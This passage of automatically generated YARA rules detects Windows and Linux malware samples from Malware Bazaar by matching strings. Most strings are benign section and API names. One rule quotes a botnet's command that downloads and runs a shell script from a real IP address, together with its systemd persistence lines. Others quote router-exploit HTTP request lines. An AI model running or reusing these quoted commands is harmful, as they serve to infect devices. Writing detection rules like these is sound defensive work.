        description = "Auto ML: e24f84235d063a70edbd6965a5e3639368e87a6ab7cccd661e49c07a0439d0bd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "system"
        $s7 = "no such process"
        $s8 = "already connected"
        $s9 = "bad file descriptor"
        $s10 = "connection aborted"
        $s11 = "connection already in progress"
        $s12 = "connection refused"
        $s13 = "connection reset"
        $s14 = "file exists"
        $s15 = "file too large"
        $s16 = "filename too long"
        $s17 = "network reset"
        $s18 = "no child process"
        $s19 = "no such file or directory"
        $s20 = "not a socket"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 418KB and
        all of them
}

rule Windows_e296340b2b842ca4367266701deccfa2eb1105a87bca21db8820fd17a07867de
{
    meta:
        description = "Auto ML: e296340b2b842ca4367266701deccfa2eb1105a87bca21db8820fd17a07867de"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"
        $s6 = "CreateCompatibleBitmap"
        $s7 = "SetupDiGetClassDevsA"
        $s8 = "GetModuleHandleA"
        $s9 = "ExitProcess"
        $s10 = "GetProcAddress"
        $s11 = "LoadLibraryA"
        $s12 = "USER32.dll"
        $s13 = "SHELL32.dll"
        $s14 = "KERNEL32.dll"
        $s15 = "!Cmdo"
        $s16 = "CRYPT32.dll"
        $s17 = "gdiplus.dll"
        $s18 = "SETUPAPI.dll"
        $s19 = "ADVAPI32.dll"
        $s20 = "SHGetFolderPathA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4555KB and
        all of them
}

rule Windows_e339907b677c77e7f0b7c91317404399f713d36526b2b2767d3eaae65099943b
{
    meta:
        description = "Auto ML: e339907b677c77e7f0b7c91317404399f713d36526b2b2767d3eaae65099943b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "get_ImagenURL"
        $s6 = "set_ImagenURL"
        $s7 = "get_jUHQ"
        $s8 = "get_Marca"
        $s9 = "set_Marca"
        $s10 = "get_Categoria"
        $s11 = "set_Categoria"
        $s12 = "System.Data"
        $s13 = "setearConsulta"
        $s14 = "System.Collections.Generic"
        $s15 = "Read"
        $s16 = "add_Load"
        $s17 = "frmConSettings_Load"
        $s18 = "set_AutoScaleMode"
        $s19 = "set_SizeMode"
        $s20 = "set_Image"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 618KB and
        all of them
}

rule Windows_e341875335ab0192719a7a17c39dd43fe185be56d7dff52c8434525489523007
{
    meta:
        description = "Auto ML: e341875335ab0192719a7a17c39dd43fe185be56d7dff52c8434525489523007"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "SetDllDirectoryW"
        $s7 = "SetDefaultDllDirectories"
        $s8 = "s:IDS_BROWSETITLE"
        $s9 = "s:IDS_CMDEXTRACTING"
        $s10 = "s:IDS_FILEHEADERBROKEN"
        $s11 = "s:IDS_CANNOTOPEN"
        $s12 = "s:IDS_CANNOTCREATE"
        $s13 = "s:IDS_WRITEERROR"
        $s14 = "s:IDS_READERROR"
        $s15 = "s:IDS_CLOSEERROR"
        $s16 = "s:IDS_CREATEERRORS"
        $s17 = "s:IDS_ALLFILES"
        $s18 = "s:IDS_EXTRFILESTO"
        $s19 = "s:IDS_EXTRFILESTOTEMP"
        $s20 = "s:IDS_WRONGFILEPASSWORD"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3393KB and
        all of them
}

rule Linux_e348669f43d0f2f0d3086f1eb8d6f9a8dc25a126751abef26a1b366d230dc2e4
{
    meta:
        description = "Auto ML: e348669f43d0f2f0d3086f1eb8d6f9a8dc25a126751abef26a1b366d230dc2e4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 193KB and
        all of them
}

rule Linux_e38d9aafca1585cd213d03ac642918cd37b2f0dc52415fd13fdb038048515c21
{
    meta:
        description = "Auto ML: e38d9aafca1585cd213d03ac642918cd37b2f0dc52415fd13fdb038048515c21"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SCSj"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 1KB and
        all of them
}

rule Linux_e3b86b018dd2ab1f24426797cf4cb4cf0adbabc57e1f359b46233176dc590938
{
    meta:
        description = "Auto ML: e3b86b018dd2ab1f24426797cf4cb4cf0adbabc57e1f359b46233176dc590938"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "/proc/%d/cmdline"
        $s5 = "wget"
        $s6 = "/usr/lib/systemd/systemd"
        $s7 = "/usr/libexec/openssh/sftp-server"
        $s8 = "shell"
        $s9 = "httpd"
        $s10 = "system"
        $s11 = "No such file or directory"
        $s12 = "No such process"
        $s13 = "Interrupted system call"
        $s14 = "Bad file descriptor"
        $s15 = "No child processes"
        $s16 = "Resource temporarily unavailable"
        $s17 = "File exists"
        $s18 = "Too many open files in system"
        $s19 = "Too many open files"
        $s20 = "Text file busy"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 141KB and
        all of them
}

rule Windows_e3cdb09481565d89e6123cf4145a1291d7abeac808d2f19364f9a3e04c3e1ccc
{
    meta:
        description = "Auto ML: e3cdb09481565d89e6123cf4145a1291d7abeac808d2f19364f9a3e04c3e1ccc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4760KB and
        all of them
}

rule Windows_e3d5437ab324ea9edf537a1e22032cbe89455ebb52ca40a61d5e68c325fc578f
{
    meta:
        description = "Auto ML: e3d5437ab324ea9edf537a1e22032cbe89455ebb52ca40a61d5e68c325fc578f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Runtime.CompilerServices"
        $s5 = "System"
        $s6 = "System.Diagnostics"
        $s7 = "System.Reflection"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "AssemblyFileVersionAttribute"
        $s10 = "TargetFrameworkAttribute"
        $s11 = "System.Runtime.Versioning"
        $s12 = "System.Core"
        $s13 = "System.Resources"
        $s14 = "System.Diagnostics.CodeAnalysis"
        $s15 = "wavsupply_kcsupreme_resurgence_grossbank.exe"
        $s16 = "<Module>"
        $s17 = "ThreadSafeObjectProvider`1"
        $s18 = "MySettings"
        $s19 = "ApplicationSettingsBase"
        $s20 = "System.Configuration"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4033KB and
        all of them
}

rule Linux_15c433828847f09df5b0fa973969b28f020fc34661025819b1fd70cd0c9ac9ef
{
    meta:
        description = "Auto ML: 15c433828847f09df5b0fa973969b28f020fc34661025819b1fd70cd0c9ac9ef"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "/cmdline"
        $s3 = "/wget"
        $s4 = "/bin/bash -c \"/bin/wget http://82.165.215.205/bins/bins.sh; chmod +x bins.sh; sh bins.sh; /bin/curl -k -L --output bins.sh http://82.165.215.205/bins/bins.sh; chmod +x bins.sh; sh bins.sh\""
        $s5 = "After=network.target"
        $s6 = "User=root"
        $s7 = "WantedBy=multi-user.target"
        $s8 = "/lib/systemd/system/bot.service"
        $s9 = "/bin/systemctl enable bot"
        $s10 = "No such file or directory"
        $s11 = "No such process"
        $s12 = "Interrupted system call"
        $s13 = "Bad file descriptor"
        $s14 = "No child processes"
        $s15 = "Resource temporarily unavailable"
        $s16 = "File exists"
        $s17 = "Too many open files in system"
        $s18 = "Too many open files"
        $s19 = "Text file busy"
        $s20 = "File too large"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 99KB and
        all of them
}

rule Windows_e411f99065fcc88640aa59af80d78e7f593389530916f7461bd63e3edc2413dd
{
    meta:
        description = "Auto ML: e411f99065fcc88640aa59af80d78e7f593389530916f7461bd63e3edc2413dd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Reflection"
        $s5 = "System"
        $s6 = "TargetFrameworkAttribute"
        $s7 = "System.Runtime.Versioning"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "System.Runtime.CompilerServices"
        $s10 = "AssemblyFileVersionAttribute"
        $s11 = "System.Diagnostics"
        $s12 = "Kingdom.exe"
        $s13 = "<Module>"
        $s14 = "<Module>{151F5043-170C-4FAC-B47B-5871057047F8}"
        $s15 = "<Module>{ca213dc6-8290-45cc-b63f-cf68637fe8c2}"
        $s16 = "get_Days"
        $s17 = "kernel32.dll"
        $s18 = "CreateThread"
        $s19 = "get_Message"
        $s20 = "WriteLine"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1723KB and
        all of them
}

rule Windows_e4483d851c0dbc14d70fe4f6b961eaa94fc27acf8f4005fda0cf2b7cb665c695
{
    meta:
        description = "Auto ML: e4483d851c0dbc14d70fe4f6b961eaa94fc27acf8f4005fda0cf2b7cb665c695"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 289KB and
        all of them
}

rule Windows_e4615b74d62f384d23e58bc467c615b17779e4f8084c8a0134db97a5e642027f
{
    meta:
        description = "Auto ML: e4615b74d62f384d23e58bc467c615b17779e4f8084c8a0134db97a5e642027f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".text"
        $s3 = "`.data"
        $s4 = ".rdata"
        $s5 = "@.rsrc"
        $s6 = "@.reloc"
        $s7 = "System::Sysutils::Exception"
        $s8 = "System::UnicodeString"
        $s9 = "System::TObject"
        $s10 = "System::AnsiStringT<0>"
        $s11 = "TRegistry *[2]"
        $s12 = "System::WideString"
        $s13 = "System::Variant"
        $s14 = "System::AnsiStringBase"
        $s15 = "TRegistry *"
        $s16 = "System::Win::Registry::TRegistry"
        $s17 = "TCLS_FileManager *"
        $s18 = "TCLS_FileManager"
        $s19 = "TCLS_Thread_Aud *"
        $s20 = "System::Classes::TStream"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 14938KB and
        all of them
}

rule Windows_e46cf506bfb4234c04ff59e043986e5a3b2ff8fa04c316aefdc0d0c0e72a2c18
{
    meta:
        description = "Auto ML: e46cf506bfb4234c04ff59e043986e5a3b2ff8fa04c316aefdc0d0c0e72a2c18"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.textbss"
        $s3 = ".rdata"
        $s4 = "@.data"
        $s5 = ".rsrc"
        $s6 = "@.reloc"
        $s7 = "Roland GS Sound Set/Microsoft (P) 1996 Roland Corporation"
        $s8 = "GetProcessHeap"
        $s9 = "GetModuleFileNameW"
        $s10 = "CloseHandle"
        $s11 = "CreateEventA"
        $s12 = "GetModuleHandleA"
        $s13 = "HeapCreate"
        $s14 = "KERNEL32.dll"
        $s15 = "GetDlgCtrlID"
        $s16 = "GetClassInfoW"
        $s17 = "GetClassInfoExW"
        $s18 = "GetScrollRange"
        $s19 = "SetMenuItemInfoW"
        $s20 = "CreateAcceleratorTableW"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 449KB and
        all of them
}

rule Windows_e47783b37ffa50108e4447b9a0e10d608b07944c9a00505ae14bda00ffcd5d86
{
    meta:
        description = "Auto ML: e47783b37ffa50108e4447b9a0e10d608b07944c9a00505ae14bda00ffcd5d86"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4469KB and
        all of them
}

rule Windows_e47adcbfc33657d6751d44bde7860ae8e46fdc0aa328614d2adf27fe3e32720b
{
    meta:
        description = "Auto ML: e47adcbfc33657d6751d44bde7860ae8e46fdc0aa328614d2adf27fe3e32720b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Runtime.CompilerServices"
        $s5 = "System"
        $s6 = "System.Reflection"
        $s7 = "TargetFrameworkAttribute"
        $s8 = "System.Runtime.Versioning"
        $s9 = "System.Runtime.InteropServices"
        $s10 = "<Module>"
        $s11 = "uNCBVkfOyKsCMDyYGAqODKFprWPlNDvqCBhdIxBNVxpGsYUsQrpGti"
        $s12 = "ubGOrswmluoXhHUeHKMVwLSGmXllPZWkJcMDkMYqYEfXhwKhvVKxexXiJAcTHKXLXDNFuRuvlVxrgu"
        $s13 = "bkSKZkRVZRUpSzVyepOgieofgDLwdHqgTJFddwiNQFHfxExvpEwVr"
        $s14 = "uteWRJhMCXCZjAaoNGMQqnhICtSEtiaubbHbyMkUAopwDTtj"
        $s15 = "nfOCmdawCaYlIDSCtDUMzyDUEWbjrDVanlHGKUrKkwTSZEgaXlrpG"
        $s16 = "nsqGWsopCpwbknUOitsylFVjCYdZAXclJZdeBwhCPQgTzBlflFmudVdhWHDxPOpeNLSKKpNmMpjVYBjAmxnvlhInv"
        $s17 = "NcylBImJQYGbKypljapLOLiLjLciEZNNwRHzfeWIjqZaotGvwifrLdrBumBqfDFqKsetrpGFDhcYmHWpEh"
        $s18 = "uaRldjeDwxwTocpFizShahqCMDdqWxcZnOTtywSAlzoRtzukwWVERJpMjPZaFohyVXgZIwHmhSwbtYIMJttAbXHdYHJjWrvwS"
        $s19 = "zoWBiWInTaLzzdfCOyLUIdPNrPL"
        $s20 = "<Module>{A6ABEC00-6634-4363-98F8-85ACE4A560B9}"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 349KB and
        all of them
}

rule Windows_e47d112f2d69f2f2d49a34a4857604e11bb89ba9c8f24f46fe6ae8bbe9c31b83
{
    meta:
        description = "Auto ML: e47d112f2d69f2f2d49a34a4857604e11bb89ba9c8f24f46fe6ae8bbe9c31b83"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".reloc"
        $s5 = "B.rsrc"
        $s6 = "delete"
        $s7 = "delete[]"
        $s8 = "`placement delete closure'"
        $s9 = "`placement delete[] closure'"
        $s10 = "`local static thread guard'"
        $s11 = "FlsGetValue"
        $s12 = "FlsSetValue"
        $s13 = "CorExitProcess"
        $s14 = "AreFileApisANSI"
        $s15 = "AppPolicyGetProcessTerminationMethod"
        $s16 = ".text$mn"
        $s17 = ".text$x"
        $s18 = ".rdata"
        $s19 = ".rdata$r"
        $s20 = ".rdata$sxdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3579KB and
        all of them
}

rule Linux_e4a24a35afb9a76845914a9215404bead4b73b36f9a6a9a88f8ee7d6bba48ae0
{
    meta:
        description = "Auto ML: e4a24a35afb9a76845914a9215404bead4b73b36f9a6a9a88f8ee7d6bba48ae0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "processor"
        $s4 = "/sys/devices/system/cpu"
        $s5 = "_Unwind_VRS_Get"
        $s6 = "_Unwind_VRS_Set"
        $s7 = "_Unwind_GetCFA"
        $s8 = "_Unwind_Complete"
        $s9 = "_Unwind_DeleteException"
        $s10 = "_Unwind_GetTextRelBase"
        $s11 = "_Unwind_GetDataRelBase"
        $s12 = "__gnu_Unwind_ForcedUnwind"
        $s13 = "__gnu_Unwind_Resume"
        $s14 = "__gnu_Unwind_RaiseException"
        $s15 = "__gnu_Unwind_Resume_or_Rethrow"
        $s16 = "_Unwind_VRS_Pop"
        $s17 = "__aeabi_unwind_cpp_pr2"
        $s18 = "__aeabi_unwind_cpp_pr1"
        $s19 = "__aeabi_unwind_cpp_pr0"
        $s20 = "_Unwind_GetLanguageSpecificData"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 125KB and
        all of them
}

rule Windows_e4a811441488a49a640f234d4e514d6746ad7ea39c4f1fe750182a358acc4d0d
{
    meta:
        description = "Auto ML: e4a811441488a49a640f234d4e514d6746ad7ea39c4f1fe750182a358acc4d0d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "kernel32.dll"
        $s6 = "GetCurrentThreadId"
        $s7 = "SetCurrentDirectoryA"
        $s8 = "GetCurrentDirectoryA"
        $s9 = "ExitProcess"
        $s10 = "RtlUnwind"
        $s11 = "TlsSetValue"
        $s12 = "TlsGetValue"
        $s13 = "GetModuleHandleA"
        $s14 = "GetProcessHeap"
        $s15 = "WriteFile"
        $s16 = "SetFilePointer"
        $s17 = "LoadResource"
        $s18 = "GetWindowsDirectoryA"
        $s19 = "GetTempPathA"
        $s20 = "GetSystemDirectoryA"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 5155KB and
        all of them
}

rule Windows_e4b81a5e79ff5b6ba6f6eda3b8bda8172409ac2165a23dba8d04f717adf07577
{
    meta:
        description = "Auto ML: e4b81a5e79ff5b6ba6f6eda3b8bda8172409ac2165a23dba8d04f717adf07577"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "USERENV"
        $s6 = "SETUPAPI"
        $s7 = "RegSetValueExW"
        $s8 = "RegCloseKey"
        $s9 = "RegDeleteValueW"
        $s10 = "RegDeleteKeyW"
        $s11 = "OpenProcessToken"
        $s12 = "RegOpenKeyExW"
        $s13 = "RegCreateKeyExW"
        $s14 = "ADVAPI32.dll"
        $s15 = "SHFileOperationW"
        $s16 = "SHGetFileInfoW"
        $s17 = "SHGetPathFromIDListW"
        $s18 = "ShellExecuteExW"
        $s19 = "SHELL32.dll"
        $s20 = "CoCreateInstance"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2410KB and
        all of them
}

rule Linux_01c6a49061ce6552a560ad15ce8b0b07f2655bf7e5e917e6f37efacbde4d0572
{
    meta:
        description = "Auto ML: 01c6a49061ce6552a560ad15ce8b0b07f2655bf7e5e917e6f37efacbde4d0572"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)"
        $s2 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
        $s3 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00"
        $s4 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00"
        $s5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00"
        $s6 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01"
        $s7 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00"
        $s8 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s9 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36"
        $s10 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
        $s11 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"
        $s12 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
        $s13 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
        $s14 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
        $s15 = "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)"
        $s16 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s17 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s18 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36"
        $s19 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)"
        $s20 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 98KB and
        all of them
}

rule Linux_15e3ab21fd0421032745734a0e1f788934785da7fec500914da23894b37bbfec
{
    meta:
        description = "Auto ML: 15e3ab21fd0421032745734a0e1f788934785da7fec500914da23894b37bbfec"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "processor"
        $s2 = "/sys/devices/system/cpu"
        $s3 = "_Unwind_VRS_Get"
        $s4 = "_Unwind_VRS_Set"
        $s5 = "_Unwind_GetCFA"
        $s6 = "_Unwind_Complete"
        $s7 = "_Unwind_DeleteException"
        $s8 = "_Unwind_GetTextRelBase"
        $s9 = "_Unwind_GetDataRelBase"
        $s10 = "__gnu_Unwind_ForcedUnwind"
        $s11 = "__gnu_Unwind_Resume"
        $s12 = "__gnu_Unwind_RaiseException"
        $s13 = "__gnu_Unwind_Resume_or_Rethrow"
        $s14 = "_Unwind_VRS_Pop"
        $s15 = "__aeabi_unwind_cpp_pr2"
        $s16 = "__aeabi_unwind_cpp_pr1"
        $s17 = "__aeabi_unwind_cpp_pr0"
        $s18 = "_Unwind_GetLanguageSpecificData"
        $s19 = "__gnu_unwind_execute"
        $s20 = "__gnu_unwind_frame"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 129KB and
        all of them
}

rule Windows_e4ba43dc277e470e668df7507af2bdb30c7bca40393e5f76a096408f1e04cb5c
{
    meta:
        description = "Auto ML: e4ba43dc277e470e668df7507af2bdb30c7bca40393e5f76a096408f1e04cb5c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "dSget"
        $s6 = "SCmD"
        $s7 = "*SETu"
        $s8 = "<Module>"
        $s9 = "System"
        $s10 = "System.Reflection"
        $s11 = "AssemblyFileVersionAttribute"
        $s12 = "System.Runtime.InteropServices"
        $s13 = "System.Runtime.CompilerServices"
        $s14 = "System.Diagnostics"
        $s15 = "ProcessStartInfo"
        $s16 = "set_FileName"
        $s17 = "System.Text"
        $s18 = "get_ASCII"
        $s19 = "GetString"
        $s20 = "set_Arguments"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1953KB and
        all of them
}

rule Windows_e4bfddcd30b8deab9039af5713b550132fa1603d6104eb5218b3eac0dfe835be
{
    meta:
        description = "Auto ML: e4bfddcd30b8deab9039af5713b550132fa1603d6104eb5218b3eac0dfe835be"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "TEMP"
        $s7 = "USERPROFILE"
        $s8 = "GetUserDefaultUILanguage"
        $s9 = "kernel32.dll"
        $s10 = "TFile"
        $s11 = "EFileError"
        $s12 = "File I/O error %d"
        $s13 = "TCompressedBlockReader"
        $s14 = "TSetupLanguageEntry@"
        $s15 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s16 = "shell32.dll"
        $s17 = "InnoSetupLdrWindow"
        $s18 = "Inno Setup Setup Data (5.1.2)"
        $s19 = "Inno Setup Messages (5.1.0)"
        $s20 = "DeleteCriticalSection"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4758KB and
        all of them
}

rule Linux_e4bfdf450f02733fd21e24d0bab012f263f5366fe62a922248dc45c3d42accad
{
    meta:
        description = "Auto ML: e4bfdf450f02733fd21e24d0bab012f263f5366fe62a922248dc45c3d42accad"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
